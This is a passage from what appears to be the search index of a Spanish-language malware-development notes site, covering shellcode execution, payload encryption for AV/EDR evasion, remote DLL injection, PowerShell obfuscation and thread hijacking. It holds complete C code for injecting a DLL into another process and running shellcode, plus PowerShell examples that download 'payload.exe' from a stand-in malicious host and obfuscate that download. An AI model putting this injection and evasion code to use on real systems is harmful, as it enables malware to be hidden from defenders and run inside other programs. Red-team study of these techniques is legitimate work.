dwOldProtection = NULL;\n\n    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {\n        printf(\"[!] VirtualProtect Failed With Error : %d \\n\", GetLastError());\n        return -1;\n    }\n\n    printf(\"[#] Press &lt;Enter&gt; To Run ... \");\n    getchar();\n    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {\n        printf(\"[!] CreateThread Failed With Error : %d \\n\", GetLastError());\n        return -1;\n    }\n\n    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);\n    printf(\"[#] Press &lt;Enter&gt; To Quit ... \");\n    getchar();\n    return 0;\n}\n</code></pre>"},{"location":"WindowsHacking/localPayloadsDLL/#deallocating-memory","title":"Deallocating Memory","text":"<p>VirtualFree es una WinAPI que se utiliza para desasignar memoria previamente asignada. Esta funci\u00f3n solo debe ser llamada despu\u00e9s de que el payload haya terminado completamente su ejecuci\u00f3n, de lo contrario podr\u00eda liberar el contenido del payload y hacer que el proceso se bloquee.</p> <p><pre><code>BOOL VirtualFree(\n  [in] LPVOID lpAddress,\n  [in] SIZE_T dwSize,\n  [in] DWORD  dwFreeType\n);\n</code></pre> <code>VirtualFree</code> toma la direcci\u00f3n base de la memoria asignada que se va a liberar (<code>lpAddress</code>), el tama\u00f1o de la memoria a liberar (<code>dwSize</code>) y el tipo de operaci\u00f3n de liberaci\u00f3n (<code>dwFreeType</code>) que puede ser una de las siguientes flags:</p> <ul> <li> <p><code>MEM_DECOMMIT</code> - La llamada <code>VirtualFree</code> liberar\u00e1 la memoria f\u00edsica sin liberar el espacio de direcciones virtuales que est\u00e1 vinculado a ella. Como resultado, el espacio de direcciones virtuales a\u00fan puede ser utilizado para asignar memoria en el futuro, pero las p\u00e1ginas vinculadas a \u00e9l ya no est\u00e1n respaldadas por memoria f\u00edsica.</p> </li> <li> <p><code>MEM_RELEASE</code> - Tanto el espacio de direcciones virtuales como la memoria f\u00edsica asociada con la memoria virtual asignada son liberados. Nota que seg\u00fan la documentaci\u00f3n de Microsoft, cuando se usa esta flag el par\u00e1metro <code>dwSize</code> debe ser 0.</p> </li> </ul>"},{"location":"WindowsHacking/payloads/","title":"Resumen de T\u00e9cnicas de Cifrado de Payloads","text":"<p>Cifrar payloads es una t\u00e9cnica fundamental en malware para evadir detecci\u00f3n est\u00e1tica, dificultar el an\u00e1lisis y mantener el c\u00f3digo ofuscado hasta el momento de ejecuci\u00f3n.</p>"},{"location":"WindowsHacking/payloads/#objetivos-comunes","title":"\ud83d\udccc Objetivos comunes:","text":"<ul> <li>Evadir detecci\u00f3n por firmas (AV/EDR).</li> <li>Ocultar shellcode o cadenas sensibles.</li> <li>Ejecutar el payload en memoria de forma segura.</li> </ul>"},{"location":"WindowsHacking/payloads/#1-xor-encryption","title":"1. \ud83e\uddea XOR Encryption","text":""},{"location":"WindowsHacking/payloads/#caracteristicas","title":"\u2728 Caracter\u00edsticas:","text":"<ul> <li>Algoritmo extremadamente simple y reversible.</li> <li>Usa el operador l\u00f3gico XOR (<code>^</code>) entre cada byte del payload y una clave.</li> <li>Mismo c\u00f3digo para cifrar y descifrar.</li> <li>Muy liviano, no requiere WinAPI ni librer\u00edas externas.</li> </ul>"},{"location":"WindowsHacking/payloads/#implementaciones-vistas","title":"\ud83d\udd27 Implementaciones vistas:","text":"<pre><code>// XOR con clave de 1 byte\np[i] = p[i] ^ key;\n\n// XOR con clave din\u00e1mica\np[i] = p[i] ^ (key + i);\n\n// XOR con array de clave\np[i] = p[i] ^ key[i % key_size];\n</code></pre>"},{"location":"WindowsHacking/payloads/#ventajas","title":"\u2705 Ventajas:","text":"<ul> <li>F\u00e1cil de implementar.</li> <li>Bajo consumo de recursos.</li> <li>Puede usarse para ofuscar cadenas embebidas o shellcodes cortos.</li> </ul>"},{"location":"WindowsHacking/payloads/#desventajas","title":"\u274c Desventajas:","text":"<ul> <li>F\u00e1cilmente detectable por herramientas de an\u00e1lisis.</li> <li>Espacio de clave peque\u00f1o si no se hace bien.</li> <li>No criptogr\u00e1ficamente seguro.</li> </ul>"},{"location":"WindowsHacking/payloads/#2-rc4-encryption","title":"2. RC4 Encryption","text":""},{"location":"WindowsHacking/payloads/#caracteristicas_1","title":"\u2728 Caracter\u00edsticas:","text":"<ul> <li>Cifrado de flujo, sim\u00e9trico y reversible.</li> <li>M\u00e1s fuerte que XOR, pero deprecated en criptograf\u00eda moderna.</li> <li>Puede usarse con librer\u00edas propias o funciones ocultas de Windows.</li> </ul>"},{"location":"WindowsHacking/payloads/#implementaciones-vistas_1","title":"\ud83d\udd27 Implementaciones vistas:","text":""},{"location":"WindowsHacking/payloads/#metodo-1-rc4-manual-con-estructura-rc4context","title":"M\u00e9todo 1: RC4 manual (con estructura <code>Rc4Context</code>)","text":"<ul> <li>Inicializaci\u00f3n con <code>rc4Init</code>.</li> <li>Cifrado con <code>rc4Cipher</code>.</li> </ul>"},{"location":"WindowsHacking/payloads/#metodo-2-systemfunction032-winapi-advapi32dll","title":"M\u00e9todo 2: SystemFunction032 (WinAPI, Advapi32.dll)","text":"<pre><code>typedef NTSTATUS (NTAPI *fnSystemFunction032)(USTRING* Data, USTRING* Key);\n</code></pre>"},{"location":"WindowsHacking/payloads/#metodo-3-systemfunction033","title":"M\u00e9todo 3: SystemFunction033","text":"<ul> <li>Id\u00e9ntico al anterior, distinta funci\u00f3n.</li> <li>Misma estructura, diferente nombre para evadir detecci\u00f3n.</li> </ul>"},{"location":"WindowsHacking/payloads/#ventajas_1","title":"\u2705 Ventajas:","text":"<ul> <li>R\u00e1pido y f\u00e1cil de usar en c\u00f3digo real.</li> <li>Implementaci\u00f3n con WinAPI es compacta y puede aprovechar funciones del sistema.</li> <li>Ideal para payloads medianos.</li> </ul>"},{"location":"WindowsHacking/payloads/#desventajas_1","title":"\u274c Desventajas:","text":"<ul> <li>Puede dejar rastros en el IAT (<code>advapi32.dll</code>).</li> <li>Puede ser detectable por AV si no se ofusca.</li> <li>Menos seguro que AES.</li> </ul>"},{"location":"WindowsHacking/payloads/#3-aes-encryption","title":"3. AES Encryption","text":""},{"location":"WindowsHacking/payloads/#caracteristicas_2","title":"\u2728 Caracter\u00edsticas:","text":"<ul> <li>Algoritmo seguro y moderno, por bloques (128 bits).</li> <li>AES-256-CBC requiere:<ul> <li>Clave de 32 bytes.</li> <li>IV (Initialization Vector) de 16 bytes.</li> </ul> </li> <li>Requiere padding si el tama\u00f1o del payload no es m\u00faltiplo de 16.</li> </ul>"},{"location":"WindowsHacking/payloads/#implementaciones-vistas_2","title":"\ud83d\udd27 Implementaciones vistas:","text":""},{"location":"WindowsHacking/payloads/#con-winapi-bcrypt","title":"\ud83d\udd39 Con WinAPI (<code>bcrypt</code>):","text":"<p>Usa funciones como: - <code>BCryptOpenAlgorithmProvider</code> - <code>BCryptEncrypt</code> / <code>BCryptDecrypt</code> - Padding autom\u00e1tico con <code>BCRYPT_BLOCK_PADDING</code>.</p>"},{"location":"WindowsHacking/payloads/#con-tiny-aes-c","title":"\ud83d\udd39 Con Tiny-AES-C:","text":"<ul> <li>Librer\u00eda portable, sin dependencias.</li> <li>No deja trazas en el IAT.</li> <li>No soporta padding \u2192 se requiere implementaci\u00f3n manual.</li> </ul>"},{"location":"WindowsHacking/payloads/#ventajas_2","title":"\u2705 Ventajas:","text":"<ul> <li>Muy seguro.</li> <li>Compatible con est\u00e1ndares modernos.</li> <li>Ideal para proteger payloads grandes o sensibles.</li> </ul>"},{"location":"WindowsHacking/payloads/#desventajas_2","title":"\u274c Desventajas:","text":"<ul> <li>Requiere m\u00e1s c\u00f3digo.</li> <li>Con <code>bcrypt</code>, deja trazas en el IAT.</li> <li>Con Tiny-AES, se deben manejar detalles como padding y detecci\u00f3n por firmas.</li> </ul>"},{"location":"WindowsHacking/payloads/#complejidad-temporal","title":"\ud83e\uddee Complejidad Temporal","text":"Algoritmo Complejidad Temporal XOR O(n) RC4 O(n) AES O(n) <p>Nota: <code>n</code> = tama\u00f1o del payload en bytes. Todos procesan byte a byte o bloque a bloque.</p>"},{"location":"WindowsHacking/payloads/#conclusion-y-recomendaciones","title":"\ud83e\udde0 Conclusi\u00f3n y Recomendaciones","text":"Objetivo Mejor opci\u00f3n Ofuscar una string o dato peque\u00f1o XOR con clave variable Cifrar shellcode sin depender de WinAPI Tiny-AES con padding Cifrar payloads con APIs nativas AES con bcrypt (WinAPI) Evadir detecci\u00f3n de funciones criptogr\u00e1ficas RC4 con SystemFunction033 C\u00f3digo muy compacto y r\u00e1pido RC4 o XOR"},{"location":"WindowsHacking/payloads/#codigos","title":"C\u00f3digos","text":"<ul> <li>En maldev academy</li> </ul>"},{"location":"WindowsHacking/processInjection/","title":"Process Injection - DLL Injection","text":"<p>Esto es lo mismo que la inyecci\u00f3n de DLL, pero en vez de una inyecci\u00f3n local se hace en un proceso remoto.</p> <p>REPO</p>"},{"location":"WindowsHacking/processInjection/#enumerando-procesos","title":"Enumerando procesos","text":"<p>Antes de poder inyectar una DLL en un proceso, se debe elegir un proceso objetivo. Por lo tanto, el primer paso para la inyecci\u00f3n de procesos remotos es generalmente enumerar los procesos en ejecuci\u00f3n en la m\u00e1quina para conocer los procesos objetivo potenciales que pueden ser inyectados. Se requiere el ID del proceso (o PID) para abrir un handle al proceso objetivo y permitir que se realice el trabajo necesario en el proceso objetivo.</p> <p>Para eso vamos a crear una funci\u00f3n que hace una enumeraci\u00f3n lineal para determinar todos los procesos activos dentro de la maquina. La funci\u00f3n <code>GetRemoteProcessHandle</code> va a ser usada para hacer la enumeraci\u00f3n de todos los procesos abriendo un handle a cada proceso y obteniendo su nombre.</p>"},{"location":"WindowsHacking/processInjection/#createtoolhelp32snapshot","title":"CreateToolhelp32Snapshot","text":"<p>El fragmento de c\u00f3digo comienza usando CreateToolhelp32Snapshot con la flag <code>TH32CS_SNAPPROCESS</code> como su primer par\u00e1metro, que toma una snapshot de todos los procesos ejecut\u00e1ndose en el sistema en el momento en que se ejecuta la funci\u00f3n.</p> <pre><code>// Toma una snapshot de todos los procesos actualmente en ejecuci\u00f3n\nhSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n</code></pre>"},{"location":"WindowsHacking/processInjection/#estructura-de-processentry32","title":"Estructura de PROCESSENTRY32","text":"<p>Una vez que se toma la snapshot, se usa <code>Process32First</code> para obtener informaci\u00f3n del primer proceso en la snapshot. Para todos los procesos restantes en la snapshot, se usa <code>Process32Next</code>.</p> <p>La documentaci\u00f3n de Microsoft establece que tanto <code>Process32First</code> como <code>Process32Next</code> requieren que se pase una estructura <code>PROCESSENTRY32</code> como su segundo par\u00e1metro.  Despu\u00e9s de que se pasa la estructura, las funciones llenar\u00e1n la estructura con informaci\u00f3n sobre el proceso. La estructura <code>PROCESSENTRY32</code> se muestra a continuaci\u00f3n con comentarios junto a los miembros \u00fatiles de la estructura que ser\u00e1n llenados por estas funciones.</p> <pre><code>typedef struct tagPROCESSENTRY32 {\n    DWORD     dwSize;                     // Tama\u00f1o de la estructura en bytes\n    DWORD     cntUsage;                   // N\u00famero de referencias a este proceso\n    DWORD     th32ProcessID;              // El ID del proceso (PID)\n    ULONG_PTR th32DefaultHeapID;          // ID del heap por defecto del proceso\n    DWORD     th32ModuleID;               // ID del m\u00f3dulo del proceso\n    DWORD     cntThreads;                 // N\u00famero de hilos de ejecuci\u00f3n en el proceso\n    DWORD     th32ParentProcessID;        // ID del proceso padre\n    LONG      pcPriClassBase;             // Prioridad base del proceso\n    DWORD     dwFlags;                    // Flags adicionales (reservado para uso futuro)\n    CHAR      szExeFile[MAX_PATH];        // Nombre del archivo ejecutable del proceso\n} PROCESSENTRY32;\n</code></pre> <p>Despu\u00e9s de que <code>Process32First</code> o <code>Process32Next</code> llenen la estructura, los datos pueden extraerse de la estructura usando el operador punto. Por ejemplo, para extraer el PID usar <code>PROCESSENTRY32.th32ProcessID</code>.</p>"},{"location":"WindowsHacking/processInjection/#process32first-process32next","title":"Process32First &amp; Process32Next","text":"<p>Como se mencion\u00f3 anteriormente, <code>Process32First</code> se usa para obtener informaci\u00f3n del primer proceso y <code>Process32Next</code> para todos los procesos restantes en la snapshot usando un bucle <code>do-while</code>. El nombre del proceso que se est\u00e1 buscando, <code>szProcessName</code>, se compara contra el nombre del proceso en la iteraci\u00f3n actual del bucle que se extrae de la estructura poblada, <code>Proc.szExeFile</code>. Si hay una coincidencia, entonces se guarda el ID del proceso y se abre un handle para ese proceso.</p> <pre><code>// Retrieves information about the first process encountered in the snapshot.\nif (!Process32First(hSnapShot, &amp;Proc)) {\n\n    printf(\"[!] Process32First Failed With Error : %d \\n\", GetLastError());\n    goto _EndOfFunction;\n}\n\ndo {\n    // Use the dot operator to extract the process name from the populated struct\n    // If the process name matches the process we're looking for\n    if (wcscmp(Proc.szExeFile, szProcessName) == 0) {\n        // Use the dot operator to extract the process ID from the populated struct\n        // Save the PID\n        *dwProcessId  = Proc.th32ProcessID;\n        // Open a handle to the process\n        *hProcess     = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);\n        if (*hProcess == NULL)\n            printf(\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError());\n\n        break; // Exit the loop\n    }\n\n// Retrieves information about the next process recorded the snapshot.\n// While a process still remains in the snapshot, continue looping\n} while (Process32Next(hSnapShot, &amp;Proc));\n</code></pre> <ul> <li>Otro ejemplo de microsoft</li> </ul>"},{"location":"WindowsHacking/processInjection/#case-sensitive-process-name","title":"Case Sensitive process name","text":"<p>El fragmento de c\u00f3digo anterior contiene un fallo que fue pasado por alto y que puede llevar a resultados inexactos. La funci\u00f3n <code>wcscmp</code> fue usada para comparar los nombres de los procesos, pero no se tuvo en cuenta la sensibilidad a may\u00fasculas y min\u00fasculas, lo que significa que Process1.exe y process1.exe ser\u00e1n considerados como dos procesos diferentes.</p> <p>El fragmento de c\u00f3digo a continuaci\u00f3n corrige este problema convirtiendo el valor en el miembro <code>Proc.szExeFile</code> a una cadena en min\u00fasculas y luego compar\u00e1ndola con <code>szProcessName</code>. Por lo tanto, <code>szProcessName</code> siempre debe ser pasado como una cadena en min\u00fasculas.</p> <pre><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {\n\n    // According to the documentation:\n    // Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).\n    // If dwSize is not initialized, Process32First fails.\n    PROCESSENTRY32  Proc = {\n        .dwSize = sizeof(PROCESSENTRY32) \n    };\n\n    HANDLE hSnapShot = NULL;\n\n    // Takes a snapshot of the currently running processes \n    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n    if (hSnapShot == INVALID_HANDLE_VALUE){\n        printf(\"[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\", GetLastError());\n        goto _EndOfFunction;\n    }\n\n    // Retrieves information about the first process encountered in the snapshot.\n    if (!Process32First(hSnapShot, &amp;Proc)) {\n        printf(\"[!] Process32First Failed With Error : %d \\n\", GetLastError());\n        goto _EndOfFunction;\n    }\n\n    do {\n\n        WCHAR LowerName[MAX_PATH * 2];\n\n        if (Proc.szExeFile) {\n            DWORD   dwSize = lstrlenW(Proc.szExeFile);\n            DWORD   i = 0;\n\n            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);\n\n            // Converting each charachter in Proc.szExeFile to a lower case character\n            // and saving it in LowerName\n            if (dwSize &lt; MAX_PATH * 2) {\n\n                for (; i &lt; dwSize; i++)\n                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);\n\n                LowerName[i++] = '\\0';\n            }\n        }\n\n        // If the lowercase'd process name matches the process we're looking for\n        if (wcscmp(LowerName, szProcessName) == 0) {\n            // Save the PID\n            *dwProcessId = Proc.th32ProcessID;\n            // Open a handle to the process\n            *hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);\n            if (*hProcess == NULL)\n                printf(\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError());\n\n            break;\n        }\n\n    // Retrieves information about the next process recorded the snapshot.\n    // While a process still remains in the snapshot, continue looping\n    } while (Process32Next(hSnapShot, &amp;Proc));\n\n    // Cleanup\n    _EndOfFunction:\n        if (hSnapShot != NULL)\n            CloseHandle(hSnapShot);\n        if (*dwProcessId == NULL || *hProcess == NULL)\n            return FALSE;\n        return TRUE;\n    }\n</code></pre>"},{"location":"WindowsHacking/processInjection/#inyeccion-de-dll-en-un-proceso-remoto","title":"Inyecci\u00f3n de DLL en un proceso remoto","text":"<p>Una vez que se tiene un handle a un proceso remoto,, tenemos que utilizar ciertos metodos de la API de Windows para inyectar una DLL en el proceso remoto. Los pasos generales para lograr esto son los siguientes:</p> <ol> <li> <p>VirtualAllocEx - Similar a VirtualAlloc excepto que permite la asignaci\u00f3n de memoria en un proceso remoto.</p> </li> <li> <p>WriteProcessMemory - Escribe datos al proceso remoto. En este caso, se usar\u00e1 para escribir la ruta de la DLL al proceso objetivo.</p> </li> <li> <p>CreateRemoteThread - Crea un hilo en el proceso remoto</p> </li> </ol>"},{"location":"WindowsHacking/processInjection/#codigo","title":"C\u00f3digo","text":"<p>La funci\u00f3n <code>InjectDllToRemoteProcess</code> toma dos par\u00e1metros: </p> <ol> <li>Process Handle - Un handle al proceso remoto en el que se inyectar\u00e1 la DLL.</li> <li>DLL name - La ruta completa a la DLL que se inyectar\u00e1 en el proceso remoto.</li> </ol>"},{"location":"WindowsHacking/processInjection/#encontrar-la-direccion-de-loadlibraryw","title":"Encontrar la direcci\u00f3n de LoadLibraryW","text":"<p>Para cargar una DLL en un proceso remoto, necesitamos la direcci\u00f3n de <code>LoadLibraryW</code>. Esta direcci\u00f3n es la misma en ambos procesos (local y remoto).</p> <pre><code>// Obtener la direcci\u00f3n de LoadLibraryW desde kernel32.dll\npLoadLibraryW = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryW\");\n</code></pre>"},{"location":"WindowsHacking/processInjection/#asignando-memoria-y-escribiendo-la-dll","title":"Asignando memoria y escribiendo la DLL","text":"<p>Asignamos memoria en el proceso remoto para almacenar el nombre de la DLL:</p> <pre><code>// Asignar memoria en el proceso remoto\npAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n// Escribir el nombre de la DLL en la memoria asignada\nWriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten);\n</code></pre>"},{"location":"WindowsHacking/processInjection/#ejecucion-via-nuevo-hilo","title":"Ejecuci\u00f3n v\u00eda nuevo hilo","text":"<p>Creamos un hilo remoto que ejecutar\u00e1 <code>LoadLibraryW</code> con la ruta de nuestra DLL como argumento:</p> <pre><code>// Crear hilo remoto que ejecutar\u00e1 LoadLibraryW con el nombre de la DLL\nHANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);\n</code></pre> <p>El hilo remoto cargar\u00e1 la DLL en el proceso objetivo, completando la inyecci\u00f3n.</p>"},{"location":"WindowsHacking/processInjection/#codigo-completo","title":"C\u00f3digo completo","text":"<pre><code>BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {\n\n    BOOL        bSTATE                    = TRUE;\n\n    LPVOID      pLoadLibraryW             = NULL;\n    LPVOID      pAddress                  = NULL;\n\n    // fetching the size of DllName *in bytes* \n    DWORD       dwSizeToWrite             = lstrlenW(DllName) * sizeof(WCHAR);\n\n    SIZE_T      lpNumberOfBytesWritten    = NULL;\n\n    HANDLE      hThread                   = NULL;\n\n    pLoadLibraryW = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryW\");\n    if (pLoadLibraryW == NULL){\n        printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError());\n        bSTATE = FALSE; goto _EndOfFunction;\n    }\n\n    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (pAddress == NULL) {\n        printf(\"[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError());\n        bSTATE = FALSE; goto _EndOfFunction;\n    }\n\n    printf(\"[i] pAddress Allocated At : 0x%p Of Size : %d\\n\", pAddress, dwSizeToWrite);\n    printf(\"[#] Press &lt;Enter&gt; To Write ... \");\n    getchar();\n\n    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){\n        printf(\"[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError());\n        bSTATE = FALSE; goto _EndOfFunction;\n    }\n\n    printf(\"[i] Successfully Written %d Bytes\\n\", lpNumberOfBytesWritten);\n    printf(\"[#] Press &lt;Enter&gt; To Run ... \");\n    getchar();\n\n    printf(\"[i] Executing Payload ... \");\n    hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);\n    if (hThread == NULL) {\n        printf(\"[!] CreateRemoteThread Failed With Error : %d \\n\", GetLastError());\n        bSTATE = FALSE; goto _EndOfFunction;\n    }\n    printf(\"[+] DONE !\\n\");\n\n\n_EndOfFunction:\n    if (hThread)\n        CloseHandle(hThread);\n    return bSTATE;\n}\n</code></pre>"},{"location":"WindowsHacking/psofuscation/","title":"T\u00e9cnicas de Ofuscaci\u00f3n en PowerShell para Evasi\u00f3n de Detecci\u00f3n Est\u00e1tica","text":""},{"location":"WindowsHacking/psofuscation/#que-es-la-ofuscacion-en-powershell","title":"\u00bfQu\u00e9 es la Ofuscaci\u00f3n en PowerShell?","text":"<p>La ofuscaci\u00f3n consiste en alterar un script para hacerlo m\u00e1s dif\u00edcil de analizar por herramientas de seguridad como antivirus o sistemas de an\u00e1lisis est\u00e1tico, manteniendo su comportamiento original. Esto se logra transformando el c\u00f3digo en formas menos reconocibles para firmas predefinidas o heur\u00edsticas b\u00e1sicas.</p>"},{"location":"WindowsHacking/psofuscation/#tecnicas-de-ofuscacion","title":"T\u00e9cnicas de Ofuscaci\u00f3n","text":""},{"location":"WindowsHacking/psofuscation/#1-concatenacion-de-cadenas","title":"1. Concatenaci\u00f3n de Cadenas","text":"<p>Divide comandos o cadenas en fragmentos que se unen en tiempo de ejecuci\u00f3n, evitando que aparezcan palabras clave completas en el c\u00f3digo.</p> <ul> <li>Ejemplo: <pre><code>$cmd = 'G' + 'et-' + 'Process'\n&amp; $cmd\n</code></pre></li> <li>Ventaja: Dificulta la identificaci\u00f3n de comandos como <code>Get-Process</code>.</li> </ul>"},{"location":"WindowsHacking/psofuscation/#2-codificacion-de-caracteres","title":"2. Codificaci\u00f3n de Caracteres","text":"<p>Codifica el script o partes de \u00e9l, como en Base64, para ocultar su contenido legible.</p> <ul> <li>Ejemplo: <pre><code>$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process'))\npowershell -EncodedCommand $encoded\n</code></pre></li> <li>Ventaja: El script no es legible sin decodificaci\u00f3n previa.</li> </ul>"},{"location":"WindowsHacking/psofuscation/#3-uso-de-variables-aleatorias","title":"3. Uso de Variables Aleatorias","text":"<p>Reemplaza nombres de variables o funciones con cadenas generadas aleatoriamente.</p> <ul> <li>Ejemplo: <pre><code>$x7k9p2 = 'http://malicious.com'\nInvoke-WebRequest -Uri $x7k9p2\n</code></pre></li> <li>Ventaja: Evita coincidencias con nombres comunes en firmas de detecci\u00f3n.</li> </ul>"},{"location":"WindowsHacking/psofuscation/#4-inyeccion-de-codigo-dinamico","title":"4. Inyecci\u00f3n de C\u00f3digo Din\u00e1mico","text":"<p>Usa <code>Invoke-Expression</code> para ejecutar c\u00f3digo generado en tiempo de ejecuci\u00f3n, ocultando la l\u00f3gica principal.</p> <ul> <li>Ejemplo: <pre><code>$code = 'Get-' + 'Process'\nInvoke-Expression $code\n</code></pre></li> <li>Ventaja: El c\u00f3digo malicioso no est\u00e1 expl\u00edcito en el script.</li> </ul>"},{"location":"WindowsHacking/psofuscation/#5-uso-de-alias","title":"5. Uso de Alias","text":"<p>Sustituye comandos por sus alias para disfrazarlos.</p> <ul> <li>Ejemplo: <pre><code>gps  # En lugar de Get-Process\n</code></pre></li> <li>Ventaja: Los alias son menos obvios para herramientas de an\u00e1lisis.</li> </ul>"},{"location":"WindowsHacking/psofuscation/#6-ofuscacion-de-sintaxis","title":"6. Ofuscaci\u00f3n de Sintaxis","text":"<p>Aprovecha la flexibilidad de PowerShell para escribir comandos de forma no convencional.</p> <ul> <li>Ejemplo: <pre><code>Get-Process | ? { $_.Name -eq 'explorer' }\n</code></pre></li> <li>Ventaja: Complica la lectura autom\u00e1tica del script.</li> </ul>"},{"location":"WindowsHacking/psofuscation/#herramientas-utiles","title":"Herramientas \u00datiles","text":"<ul> <li>Invoke-Obfuscation: Automatiza la aplicaci\u00f3n de m\u00faltiples t\u00e9cnicas de ofuscaci\u00f3n.</li> <li>Uso B\u00e1sico: <pre><code>Import-Module Invoke-Obfuscation.psd1\nInvoke-Obfuscation -ScriptPath 'script.ps1' -OutputPath 'obfuscated.ps1'\n</code></pre></li> <li> <p>Recurso: GitHub</p> </li> <li> <p>PSDuck: Ofrece capas adicionales de ofuscaci\u00f3n.</p> </li> <li>Uso B\u00e1sico: <pre><code>Import-Module PSDuck.psm1\nPSDuck -ScriptPath 'script.ps1' -OutputPath 'obfuscated.ps1'\n</code></pre></li> <li> <p>Recurso: GitHub</p> </li> <li> <p>argfuscator: Sitio para ofuscar comandos con diferentes personalizaciones</p> </li> <li>Recurso</li> </ul>"},{"location":"WindowsHacking/psofuscation/#ejemplos-practicos","title":"Ejemplos Pr\u00e1cticos","text":""},{"location":"WindowsHacking/psofuscation/#concatenacion-de-cadenas","title":"Concatenaci\u00f3n de Cadenas","text":"<pre><code># Original\nInvoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'payload.exe'\n\n# Ofuscado\n$part1 = 'Invoke-Web'\n$part2 = 'Request'\n$uri = 'http://' + 'malicious' + '.com/payload.exe'\n$out = 'pay' + 'load.exe'\n&amp; ($part1 + $part2) -Uri $uri -OutFile $out\n</code></pre>"},{"location":"WindowsHacking/psofuscation/#codificacion-base64","title":"Codificaci\u00f3n Base64","text":"<pre><code># Original\nGet-Process\n\n# Ofuscado\n$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process'))\npowershell -EncodedCommand $encoded\n</code></pre>"},{"location":"WindowsHacking/psofuscation/#variables-aleatorias","title":"Variables Aleatorias","text":"<pre><code># Original\n$url = 'http://malicious.com'\nInvoke-WebRequest -Uri $url\n\n# Ofuscado\n$z9m4q1 = 'http://malicious.com'\nInvoke-WebRequest -Uri $z9m4q1\n</code></pre>"},{"location":"WindowsHacking/psofuscation/#consideraciones-importantes","title":"Consideraciones Importantes","text":"<ul> <li>Limitaciones: No protege contra an\u00e1lisis din\u00e1mico ni heur\u00edsticas avanzadas.</li> <li>Riesgos: La ofuscaci\u00f3n excesiva puede generar errores o levantar sospechas.</li> <li>\u00c9tica: \u00dasalo solo en entornos autorizados y legales, como pruebas de seguridad.</li> </ul>"},{"location":"WindowsHacking/psofuscation/#recursos-adicionales","title":"Recursos Adicionales","text":"<ul> <li>Art\u00edculos sobre Ofuscaci\u00f3n</li> </ul>"},{"location":"WindowsHacking/threadHijacking/","title":"Thread Hijacking - Local Thread Creation","text":"<p>Thread Execution Hijacking es una t\u00e9cnica que permite ejecutar un payload sin necesidad de crear un nuevo hilo. Esta t\u00e9cnica funciona suspendiendo el hilo y actualizando el registro que apunta a la siguiente instrucci\u00f3n en memoria para que apunte al inicio del payload. Cuando el hilo reanuda su ejecuci\u00f3n, se ejecuta el payload.</p>"},{"location":"WindowsHacking/threadHijacking/#contexto-del-hilo","title":"Contexto del hilo","text":"<p>Antes de explicar la t\u00e9cnica, se debe entender el contexto del hilo. Cada hilo tiene una prioridad de scheduling y mantiene un conjunto de estructuras que el sistema guarda en el contexto del hilo. El contexto del hilo incluye toda la informaci\u00f3n que el hilo necesita para reanudar la ejecuci\u00f3n sin problemas, incluyendo el conjunto de registros de CPU del hilo y la pila. <code>GetThreadContext</code> y <code>SetThreadContext</code> son dos WinAPIs que pueden usarse para obtener y establecer el contexto de un hilo, respectivamente.</p> <ul> <li><code>GetThreadContext</code> puebla una estructura <code>CONTEXT</code> que contiene toda la informaci\u00f3n sobre el hilo.</li> <li>Mientras que <code>SetThreadContext</code> toma una estructura <code>CONTEXT</code> poblada y la establece en el hilo especificado.</li> </ul>"},{"location":"WindowsHacking/threadHijacking/#thread-hijacking-vs-thread-creation","title":"Thread Hijacking vs Thread Creation","text":"<p>La primera pregunta que debe abordarse es por qu\u00e9 secuestrar un hilo creado para ejecutar un payload en lugar de ejecutar el payload usando un hilo reci\u00e9n creado. La principal diferencia es la exposici\u00f3n del payload y el sigilo. Crear un nuevo hilo para la ejecuci\u00f3n del payload expondr\u00e1 la direcci\u00f3n base del payload, y por lo tanto el contenido del payload, porque el punto de entrada de un nuevo hilo debe apuntar a la direcci\u00f3n base del payload en memoria. Este no es el caso con thread hijacking porque el punto de entrada del hilo estar\u00eda apuntando a una funci\u00f3n normal del proceso y por lo tanto el hilo parecer\u00eda benigno.</p>"},{"location":"WindowsHacking/threadHijacking/#creating-the-target-thread","title":"Creating The Target Thread","text":"<p>El requisito previo para realizar el hijacking de hilos es encontrar un hilo en ejecuci\u00f3n para ser hijackeado. Es importante destacar que no es posible hijackear el hilo principal de un proceso local porque el hilo objetivo debe ser colocado primero en un estado suspendido. Esto es problem\u00e1tico cuando se intenta apuntar al 